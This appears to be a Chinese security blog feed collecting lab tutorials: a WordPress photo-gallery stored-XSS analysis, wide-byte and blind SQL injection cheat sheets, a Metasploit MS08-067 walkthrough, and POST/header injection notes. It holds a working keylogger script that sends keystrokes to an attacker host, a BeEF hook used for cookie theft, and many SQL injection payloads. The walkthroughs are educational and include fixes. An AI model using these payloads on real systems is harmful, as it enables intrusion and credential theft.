WDWLibrary::get(&apos;image_alt_text_&apos; . $image_id, &apos;&apos;, &apos;wp_filter_post_kses&apos;));</span><br><span class="line">$alt = preg_replace(&quot;/]*&gt;|&lt;\/a&gt;/&quot;, &apos;&apos;, $alt);</span><br></pre></td></tr></table></figure><p>$description和$alt在使用类WDWLibrary的静态函数get时，都给get函数传入了参数wp_filter_post_kses，用于对从前端获取到的数据进行过滤消毒。</p><p>函数wp_filter_post_kses利用addslashes在函数wp_kses返回的数据中的预定义字符之前添加反斜杠，具体代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function wp_filter_post_kses( $data ) &#123;</span><br><span class="line">return addslashes( wp_kses( stripslashes( $data ), &apos;post&apos; ) );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数wp_kses用于过滤文本内容并且删除不允许的HTML字符串，返回仅包含允许的HTML字符串的筛选内容，具体代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function wp_kses( $string, $allowed_html, $allowed_protocols = array() ) &#123;</span><br><span class="line">if ( empty( $allowed_protocols ) ) &#123;</span><br><span class="line">$allowed_protocols = wp_allowed_protocols();</span><br><span class="line">&#125;</span><br><span class="line">$string = wp_kses_no_null( $string, array( &apos;slash_zero&apos; =&gt; &apos;keep&apos; ) );</span><br><span class="line">$string = wp_kses_normalize_entities( $string );</span><br><span class="line">$string = wp_kses_hook( $string, $allowed_html, $allowed_protocols );</span><br><span class="line">return wp_kses_split( $string, $allowed_html, $allowed_protocols );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中函数wp_kses_split通过正则表达式可以准确匹配并过滤XSS脚本代码，具体代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function wp_kses_split( $string, $allowed_html, $allowed_protocols ) &#123;</span><br><span class="line">global $pass_allowed_html, $pass_allowed_protocols;</span><br><span class="line">$pass_allowed_html      = $allowed_html;</span><br><span class="line">$pass_allowed_protocols = $allowed_protocols;</span><br><span class="line">return preg_replace_callback( &apos;%(|$))|(&lt;[^&gt;]*(&gt;|$)|&gt;)%&apos;, &apos;_wp_kses_split_callback&apos;, $string );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修复后的代码中，将类WDWLibrary的静态函数get中的形参$esc_html = true修改为$callback = ‘esc_html’，此时默认使用esc_html函数进行过滤；如果有实参传入，本例中传入wp_filter_post_kses，那么就使用wp_filter_post_kses函数进行过滤。</p><p>语句array_walk_recursive($value, array(‘self’, ‘validate_data’), $callback)，将参数$callback传递到类WDWLibrary本身的静态函数validate_data中，然后使用validate_data函数循环处理数组value中的值。</p><p>静态函数get的具体代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">public static function get($key, $default_value = &apos;&apos;, $callback = &apos;esc_html&apos;) &#123;</span><br><span class="line">    if (isset($_GET[$key])) &#123;</span><br><span class="line">      $value = $_GET[$key];</span><br><span class="line">    &#125;</span><br><span class="line">    elseif (isset($_POST[$key])) &#123;</span><br><span class="line">      $value = $_POST[$key];</span><br><span class="line">    &#125;</span><br><span class="line">    elseif (isset($_REQUEST[$key])) &#123;</span><br><span class="line">      $value = $_REQUEST[$key];</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">      $value = $default_value;</span><br><span class="line">    &#125;</span><br><span class="line">    if (is_array($value)) &#123;</span><br><span class="line">      array_walk_recursive($value, array(&apos;self&apos;, &apos;validate_data&apos;), $callback);</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">      self::validate_data($value, $callback);</span><br><span class="line">    &#125;</span><br><span class="line">    return $value;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>静态函数validate_data的代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">private static function validate_data(&amp;$value, $callback) &#123;</span><br><span class="line">    $value = stripslashes($value);</span><br><span class="line">    if ( $callback ) &#123;</span><br><span class="line">      $value = $callback($value);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>1.利用XSS漏洞获取键盘记录：</p><p>1.1将keyrecorder.js和keyrecorder.php保存到渗透主机Kali的/var/www/html目录下，通过命令service apache2 start来启动apache服务。</p><p>keyrecorder.js代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">document.onkeypress = function(evt)&#123;</span><br><span class="line">evt = evt || window.event</span><br><span class="line">keyrecord = String.fromCharCode(evt.charCode)</span><br><span class="line">if (keyrecord) &#123;</span><br><span class="line">var http = new XMLHttpRequest();</span><br><span class="line">var param = encodeURI(keyrecord);</span><br><span class="line">http.open(&quot;POST&quot;,&quot;http://192.168.188.156/keyrecorder.php&quot;,true);</span><br><span class="line">http.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);</span><br><span class="line">http.send(&quot;keyrecord=&quot;+param);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>keyrecorder.php代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> $key=$_POST[&apos;keyrecord&apos;];</span><br><span class="line"> $record_file=&quot;keyrecord.txt&quot;; </span><br><span class="line"> $record_fp = fopen($record_file, &quot;a&quot;);</span><br><span class="line"> fwrite($record_fp, $key);</span><br><span class="line"> fclose($record_fp); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>1.2在Alt/Title或者Description文本框中输入如下语句:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;http://192.168.188.156/keyrecorder.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>点击save按钮保存修改，再点击Preview进行照片库预览。</p><p>1.3然后在页面<a href="http://192.168.188.155/wordpress/bwg_gallery/testxss/" target="_blank" rel="noopener">http://192.168.188.155/wordpress/bwg_gallery/testxss/</a>中的所有键盘记录均会被采集并发送到渗透主机Kali，这里我们输入Hello World！，Kali中的keyrecord.txt的内容如下图所示（键盘记录采集成功）：</p><p><a href="https://image.3001.net/images/20190917/1568731791_5d80f28f65bee.png!small" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20190917/1568731791_5d80f28f65bee.png!small" alt="img"></a></p><p>如果某个Web系统的登录页面中存在存储型的XSS漏洞，只要用户输入用户名和密码，那么用户名和密码不知不觉中就会被传输到攻击者的主机中，这是极其危险的。</p><p>2.利用BeEF进行更多的操作：</p><p>2.1在Kali Linux中启动BeEF，在Alt/Title或者Description文本框中输入如下语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;http://192.168.188.156:3000/hook.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>然后在photo-gallery的Preview（预览）功能中触发XSS脚本，接着BeEF就捕获到了受害者主机，如下图所示：</p><p><a href="https://image.3001.net/images/20190917/1568732471_5d80f53784282.png!small" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20190917/1568732471_5d80f53784282.png!small" alt="img"></a></p><p>2.2通过BeEF可以获取受害者主机的Cookie。如果获取到的是管理员的Cookie，是不是瞬间感觉XSS跟SQL注入一样有魅力呢？是不是感觉XSS并不鸡肋了呢？结果如下图所示：</p><p><a href="https://image.3001.net/images/20190917/1568732504_5d80f55852362.png!small" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20190917/1568732504_5d80f55852362.png!small" alt="img"></a></p><p>2.3BeEF可以检索并获取目标页面中的所有链接，利用这一特性可以针对目标服务器进行更深一步的信息收集，结果如下图所示：</p><p><a href="https://image.3001.net/images/20190917/1568732539_5d80f57bea110.png!small" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20190917/1568732539_5d80f57bea110.png!small" alt="img"></a></p><p>2.4BeEF还可以检测受害者机器是否为虚拟机，结果如下图所示：</p><p><a href="https://image.3001.net/images/20190917/1568732557_5d80f58db75f7.png!small" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20190917/1568732557_5d80f58db75f7.png!small" alt="img"></a></p><p>PS：BeEF的功能十分强大，可以进行的操作远不止这些，这里只是简单列举了其中三个功能。</p><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>XSS漏洞的防御涉及输入和输出两部分。</p><blockquote><p>一、对用户输入的数据进行过滤消毒，包括HTML 特性、JavaScript关键字、空字符、特殊字符等等，本文中的修复方式属于这个范畴。</p><p>二、对输出到页面上的内容进行相应的编码转换，包括HTML实体编码、JavaScript编码等。</p></blockquote><p>————————————————</p><p>原文链接：<a href="https://www.freebuf.com/vuls/214534.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/214534.html</a></p></excerpt>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>宽字节注入</title>
      <link href="/2019/09/26/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5-1/"/>
      <url>/2019/09/26/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5-1/</url>
      
        <content type="html"><![CDATA[<excerpt in index> <a id="more"></a><p>宽字节（双字节）处理转义</p><p>在PHP中开启了魔术引号后，用户的输入会自动加上addslashes()，会把特殊字符进行转义，比如在url输入单引号，转以后是\’，也就是英文单引号被反斜杠干掉了，无法注入闭合那么宽字节注入就是想办法让转义单引号的反斜杠干掉；</p><p>即如果数据库采用gbk字符，那么就存在可能，方式和转义单引号差不多。gbk采用双字节表示，GBK编码范围：首字节：0x81~0xFE；尾字节：0x40~0xFE，英文字母用一个字节表示，但中文必须是两个，所以这里才去通过字节结合的形式把两个单字节合成中文干掉反斜杠；</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">?id=1%bf&apos;</span><br><span class="line"># 经过转义上述payload会变成：?id=1%bf%5c%27</span><br><span class="line"># %5c是单引号在经过服务器时转义加在它前边使它无法构成注入闭合</span><br><span class="line"># %27是单引号</span><br><span class="line"># 5c在gbk中，是合法的尾字节</span><br><span class="line"># bf是合法的首字节</span><br><span class="line"># BF5C会构成一个汉字：縗</span><br><span class="line"># 通过这种方式可以消化掉反斜杠，最后payload是：?id=1縗&apos;</span><br><span class="line"># 这种方式就能够继续爆数据了</span><br></pre></td></tr></table></figure><p>　　gbk内码查询网站：<a href="http://www.mytju.com/classcode/tools/encode_gb2312.asp" target="_blank" rel="noopener">http://www.mytju.com/classcode/tools/encode_gb2312.asp</a></p><p><img src="https://note.youdao.com/yws/public/resource/c05360de0f83e92ab428eb45429fd46f/xmlnote/B46BD2C3494D43DFA4E25A6546940D39/31793" alt="img"></p><p>　　　　实际上该漏洞也有了很好的解决方式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">　　　　　　使用mysql_set_charset(GBK)指定字符集</span><br><span class="line">　　　　　　使用mysql_real_escape_string进行转义</span><br><span class="line">　　　　　　原理是，mysql_real_escape_string与addslashes的不同之处在于其会考虑当前设置的字符集，不会出现前面e5和5c拼接为一个宽字节的问题，使用mysql_set_charset可以确定当前字符集；</span><br></pre></td></tr></table></figure></excerpt>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>盲注</title>
      <link href="/2019/09/25/%E7%9B%B2%E6%B3%A8-1/"/>
      <url>/2019/09/25/%E7%9B%B2%E6%B3%A8-1/</url>
      
        <content type="html"><![CDATA[<excerpt in index> <ul><li><a id="more"></a><the rest of contents文></the></li></ul><p>盲注就是在 sql 注入过程中，sql 语句执行的选择后，选择的数据不能回显<br>到前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。*</p><hr><p>盲注分为三类</p><p>•基于布尔SQL盲注</p><p>•基于时间的SQL盲注</p><p>•基于报错的SQL盲注</p><hr><p><strong>1：基于布尔SQL盲注———-构造逻辑判断</strong></p><p>我们可以利用逻辑判断进行</p><p>截取字符串相关函数解析<a href="http://www.cnblogs.com/lcamry/p/5504374.html（这个还是要看下）" target="_blank" rel="noopener">http://www.cnblogs.com/lcamry/p/5504374.html（这个还是要看下）</a></p><p>▲left(database(),1)&gt;’s’             //left()函数</p><p>Explain:database()显示数据库名称，left(a,b)从左侧截取a的前b位</p><p>▲ascii(substr((select table_name information_schema.tables where tables_schema=database()limit 0,1),1,1))=101 –+        //substr()函数，ascii()函数</p><p>Explain：substr(a,b,c)从b位置开始，截取字符串a的c长度。Ascii()将某个字符转换为ascii值</p><p>▲ascii(substr((select database()),1,1))=98</p><p>▲ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))&gt;98%23               //ORD()函数，MID()函数</p><p>Explain：mid(a,b,c)从位置b开始，截取a字符串的c位</p><p>Ord()函数同ascii()，将字符转为ascii值</p><p>▲regexp正则注入</p><p>正则注入介绍：<a href="http://www.cnblogs.com/lcamry/articles/5717442.html" target="_blank" rel="noopener">http://www.cnblogs.com/lcamry/articles/5717442.html</a></p><p>用法介绍：select user() regexp ‘^[a-z]’;</p><p>Explain：正则表达式的用法，user()结果为root，regexp为匹配root的正则表达式。</p><p>第二位可以用select user() regexp ‘^ro’来进行。</p><p><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/盲注01.png" alt="img"></p><p>当正确的时候显示结果为1，不正确的时候显示结果为0.</p><p>示例介绍：</p><p>I select * from users where id=1 and 1=(if((user() regexp ‘^r’),1,0));</p><p>IIselect * from users where id=1 and 1=(user() regexp’^ri’);</p><p>通过if语句的条件判断，返回一些条件句，比如if等构造一个判断。根据返回结果是否等于0或者1进行判断。</p><p>IIIselect * from users where id=1 and 1=(select 1 from information_schema.tables where table_schema=’security’ and table_name regexp ‘^us[a-z]’ limit 0,1);</p><p>这里利用select构造了一个判断语句。我们只需要更换regexp表达式即可</p><p>‘^u[a-z]’ -&gt; ‘^us[a-z]’ -&gt; ‘^use[a-z]’ -&gt; ‘^user[a-z]’ -&gt; FALSE</p><p>如何知道匹配结束了？这里大部分根据一般的命名方式（经验）就可以判断。但是如何你在无法判断的情况下，可以用table_name regexp ‘^username′来进行判断。是从开头进行匹配，′来进行判断。是从开头进行匹配，是从结尾开始判断。更多的语法可以参考mysql使用手册进行了解。</p><p>好，这里思考一个问题？有好几个，我们只得到了一个user，如何知道其他的？</p><p>这里可能会有人认为使用limit 0，1改为limit 1,1。</p><p>但是这种做法是错误的，limit作用在前面的select语句中，而不是regexp。那我们该如何选择。其实在regexp中我们是取匹配table_name中的内容，只要table_name中有的内容，我们用regexp都能够匹配到。因此上述语句不仅仅可以选择user，还可以匹配其他项。</p><p>▲like匹配注入</p><p>和上述的正则类似，mysql在匹配的时候我们可以用ike进行匹配。</p><p>用法：select user() like ‘ro%’</p><p><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/盲注02.png" alt="img"></p><p><strong>2：基于报错的SQL盲注——构造payload让信息通过错误提示回显出来</strong></p><p>▲Select 1,count(<em>),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)</em>2))a from information_schema.columns group by a;  </p><p>//explain:此处有三个点，一是需要concat计数，二是floor，取得0 or 1，进行数据的重复，三是group by进行分组，但具体原理解释不是很通，大致原理为分组后数据计数时重复造成的错误。也有解释为mysql 的bug 的问题。但是此处需要将rand(0)，rand()需要多试几次才行。</p><p>以上语句可以简化成如下的形式。</p><p>select count(<em>) from information_schema.tables group by concat(version(),floor(rand(0)</em>2))</p><p>如果关键的表被禁用了，可以使用这种形式</p><p> select count(*) from (select 1 union select null union </p><p>select !1) group by concat(version(),floor(rand(0)*2)) </p><p>如果rand被禁用了可以使用用户变量来报错</p><p> select min(@a:=1) from information_schema.tables group by concat(password,@a:=(@a+1)%2)</p><p>▲select exp(~(select * FROM(SELECT USER())a))         //double数值类型超出范围</p><p>  //Exp()为以e为底的对数函数；版本在5.5.5及其以上</p><p>可以参考exp报错文章：<a href="http://www.cnblogs.com/lcamry/articles/5509124.html" target="_blank" rel="noopener">http://www.cnblogs.com/lcamry/articles/5509124.html</a></p><p>▲select !(select * from (select user())x) -（ps:这是减号） ~0  </p><p> //bigint超出范围；~0是对0逐位取反，很大的版本在5.5.5及其以上</p><p>可以参考文章bigint溢出文章<a href="http://www.cnblogs.com/lcamry/articles/5509112.html" target="_blank" rel="noopener">http://www.cnblogs.com/lcamry/articles/5509112.html</a></p><p>▲extractvalue(1,concat(0x7e,(select @@version),0x7e))  se//mysql对xml数据进行查询和修改的xpath函数，xpath语法错误</p><p>▲updatexml(1,concat(0x7e,(select @@version),0x7e),1)   //mysql对xml数据进行查询和修改的xpath函数，xpath语法错误</p><p>▲select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;</p><p>//mysql重复特性，此处重复了version，所以报错。</p><p><strong>3:基于时间的SQL盲注———-延时注入</strong></p><p>▲If(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23  //if判断语句，条件为假，执行sleep</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Ps：遇到以下这种利用sleep()延时注入语句</span><br><span class="line"></span><br><span class="line">select sleep(find_in_set(mid(@@version, 1, 1), &apos;0,1,2,3,4,5,6,7,8,9,.&apos;));</span><br><span class="line">该语句意思是在0-9之间找版本号的第一位。但是在我们实际渗透过程中，这种用法是不可取的，因为时间会有网速等其他因素的影响，所以会影响结果的判断。</span><br></pre></td></tr></table></figure><p>▲UNION SELECT IF(SUBSTRING(current,1,1)=CHAR(119),BENCHMARK(5000000,ENCODE(‘MSG’,’by 5 seconds’)),null) FROM (select database() as current) as tb1;</p><p>   //BENCHMARK(count,expr)用于测试函数的性能，参数一为次数，二为要执行的表达式。可以让函数执行若干次，返回结果比平时要长，通过时间长短的变化，判断语句是否执行成功。这是一种边信道攻击，在运行过程中占用大量的cpu资源。推荐使用sleep()</p><p>函数进行注入。</p><table><thead><tr><th>Mysql</th><th>BENCHMARK(100000,MD5(1))  or sleep(5)</th></tr></thead><tbody><tr><td>Postgresql</td><td>PG_SLEEP(5)   OR GENERATE_SERIES(1,10000)</td></tr><tr><td>Ms sql server</td><td>WAITFOR DELAY ‘0:0:5’</td></tr></tbody></table></excerpt>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>MS08_067如何利用</title>
      <link href="/2019/09/24/MS08-067%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8/"/>
      <url>/2019/09/24/MS08-067%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<excerpt in index> <a id="more"></a><p>1.首先需要下载kali安装到VMware中，如何安装参考我之前的文本，要想复现该漏洞需要一个xp系统，防火墙关闭。这里xp系统的安装就不多做介绍了。</p><h3 id><a href="#" class="headerlink" title></a><img src="https://img-blog.csdnimg.cn/20190516112500963.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2trc3Vua2FuZ2h1aQ==,size_16,color_FFFFFF,t_70" alt></h3><p>若网络不通畅则检查自己的虚拟机设置</p><p><img src="https://img-blog.csdnimg.cn/20190516112723607.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2trc3Vua2FuZ2h1aQ==,size_16,color_FFFFFF,t_70" alt></p><p>3.打开msfconsole工具</p><p>msfconsole<img src="https://img-blog.csdnimg.cn/20190516112933411.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2trc3Vua2FuZ2h1aQ==,size_16,color_FFFFFF,t_70" alt></p><p>4.查找ms08_067,ms代表微软，08则代表08年发现的漏洞，067代表当年发现的第67个漏洞</p><p>search ms08_067<img src="https://img-blog.csdnimg.cn/20190516113217534.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2trc3Vua2FuZ2h1aQ==,size_16,color_FFFFFF,t_70" alt></p><p>5.使用上面的Name下面的漏洞名称</p><p>use exploit/windows/smb/ms08_067_netapi <img src="https://img-blog.csdnimg.cn/20190516113359546.png" alt></p><p>6.显示配置信息</p><p><img src="https://img-blog.csdnimg.cn/20190516113518719.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2trc3Vua2FuZ2h1aQ==,size_16,color_FFFFFF,t_70" alt></p><p>其中rhost为远程主机ip，我们设置成有ms08_067漏洞的xp系统的ip，用下面的命令进行设置。</p><p>7.设置rhost</p><p>set rhost 192.168.201.95 注意这里的ip为xp系统的ip地址<br>8.显示配置信息查看是否配置成功。如图rhost后面有ip地址则配置成功。</p><p><img src="https://img-blog.csdnimg.cn/20190520201930377.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2trc3Vua2FuZ2h1aQ==,size_16,color_FFFFFF,t_70" alt></p><p>9.我们查看target，用如下的命令</p><p>show targets</p><p><img src="https://img-blog.csdnimg.cn/2019052020210624.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2trc3Vua2FuZ2h1aQ==,size_16,color_FFFFFF,t_70" alt></p><p>8.设置与自己系统相同的版本，这里我选择34，设置方式如下：</p><p>set target 34</p><p><img src="https://img-blog.csdnimg.cn/2019052020224849.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2trc3Vua2FuZ2h1aQ==,size_16,color_FFFFFF,t_70" alt></p><p>9.好了到这里就配置结束了，我们开始运行：</p><p>exploit</p><p><img src="https://img-blog.csdnimg.cn/20190520202418122.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2trc3Vua2FuZ2h1aQ==,size_16,color_FFFFFF,t_70" alt></p><p>出现如下我们就成功了，已经获得了最高权限，可以进行各种操作了。</p><p>10.例如我们输入如下命令，查看对方屏幕，效果如下图：</p><p>run vnc</p><p><img src="https://img-blog.csdnimg.cn/20190520202816645.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2trc3Vua2FuZ2h1aQ==,size_16,color_FFFFFF,t_70" alt></p><p>————————————————</p><p>原文链接：<a href="https://blog.csdn.net/kksunkanghui/article/details/90260122" target="_blank" rel="noopener">https://blog.csdn.net/kksunkanghui/article/details/90260122</a></p></excerpt>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>POST注入/HEAD注入</title>
      <link href="/2019/09/24/POST%E6%B3%A8%E5%85%A5-HEAD%E6%B3%A8%E5%85%A5/"/>
      <url>/2019/09/24/POST%E6%B3%A8%E5%85%A5-HEAD%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<excerpt in index> <a id="more"></a><p>注入全方位利用-POST注入HEAD头注入</p><p>一、POST注入介绍</p><p>注入攻击的本质，是把用户输入的数据当做代码执行。</p><p> <br></p><p>这里有两个关键条件：</p><p> <br></p><p>第一个是用户能够控制输入</p><p>第二个是原本程序要执行的代码，拼接了用户输入的数据</p><p> <br></p><p>POST注入属于注入的一种，相信大家都知道POST\GET两种传参方式。</p><p>POST注入就是使用POST进行传参的注入，本质上和GET类型的没什么区别</p><p><strong>POST注入高危点：</strong></p><p><strong>登录框</strong></p><p><strong>查询框</strong></p><p>等各种和数据库有交互的框</p><p> <br></p><p>最经典的POST注入莫过于万能密码</p><p>‘or 1=1#</p><p> <br></p><p>Sqlmap如何对POST类型SQL注入进行注入</p><p>​       –forms  sqlmap去读取页面中POST传参的表单的传参名然后进行SQL注入</p><p>​       -r 1.txt sqlmap读取数据包文件进行SQL注入，注入处可以打一个*号告诉Sqlmap测试那个点</p><p> <br></p><p>二、Head注入介绍</p><p>PHP 全局变量 - 超全局变量</p><p>PHP 中的许多预定义变量都是“超全局的”，这意味着它们在一个脚本的全部作用域中都可用。</p><p>这些超全局变量是：</p><p>$_REQUEST （获取GET/POST/COOKIE） COOKIE在新版本已经无法获取了</p><p>$_POST  （获取POST传参）</p><p>$_GET  (获取GET的传参)</p><p>$_COOKIE   （获取COOKIE的值）</p><p>$_SERVER  （包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组）</p><p>$_SERVER功能强大。</p><p>$_SERVER[‘HTTP_HOST’]  请求头信息中的Host内容，获取当前域名。</p><p>$_SERVER[“HTTP_USER_AGENT”]  获取用户相关信息，包括用户浏览器、操作系统等信息。</p><p>$_SERVER[“REMOTE_ADDR”]  浏览网页的用户ip。</p><p> <br></p><p>updatexml() 更新xml文档的函数</p><p>语法：updatexml(目标xml内容，xml文档路径，更新的内容)</p><p>updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)</p><p>实际上这里是去更新了XML文档，但是我们在XML文档路径的位置里面写入了子查询，我们输入特殊字符，然后就因为不符合输入规则然后报错了</p><p>但是报错的时候他其实已经执行了那个子查询代码！</p></excerpt>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入的原理分析</title>
      <link href="/2019/09/22/SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/"/>
      <url>/2019/09/22/SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<excerpt in index> <a id="more"></a><p>一、首先先介绍一下SQL注入的思维导图：</p><p><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/SQL注入的原理分析01.png" alt></p><p>二、SQL注入的成因</p><p><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/SQL注入的原理分析02.png" alt></p><p>三、SQL注入的原理<br>用户可控参数中注入SQL语法，破坏原有SQL结构，达到编写程序时意料之外结果的攻击行为</p><p>某成因可以归结为以下两个原因叠加造成的：<br>1.程序编写者在处理应用程序和数据库交互时，使用字符串拼接的方式构造SQL语句。<br>2.未对用户可控参数进行足够的过滤便将参数内容拼接进入到SQL查询语句中。</p><p>四、哪里可能存在SQL注入？<br>1.任何客户端可控且传递到服务器的变量都有可能存在SQL注入<br>2.这些变量通常存在于GET,POST形式传递的参数中，如HTTP请求消息头部和COOKIE中。</p><p>五、注入的危害：<br>获取管理员账号密码<br>盗取数据库中的数据<br>修改数据库中的数据<br>获取Webshell</p><p>select 字段，字段 from 数据库，数据表</p><p>所有数据库名：<br>select schema_name from information_schema.schemata;</p><p>查找所有表名：<br>select table_name from information_schema.tables;</p><p>查找table表中的所有库名<br>select table_schema from information_schema.tables;</p><p>查找所有列名<br>select column_name from information_schema.columns;</p><hr><p>sql注入中常用的函数与语法</p><p>Group_concat():将select的查询结果全部显示出来，占一个显示位<br>select version（）：查询MySQL版本<br>select user（）：查询数据库用户名<br>select database（）：查询数据库名<br>select @@datadir()：查询数据库的绝对路径<br>select @@version_compile_os:查询操作系统版本<br>select current_user():查询当前用户<br>Order by: 找列的数量<br>Union 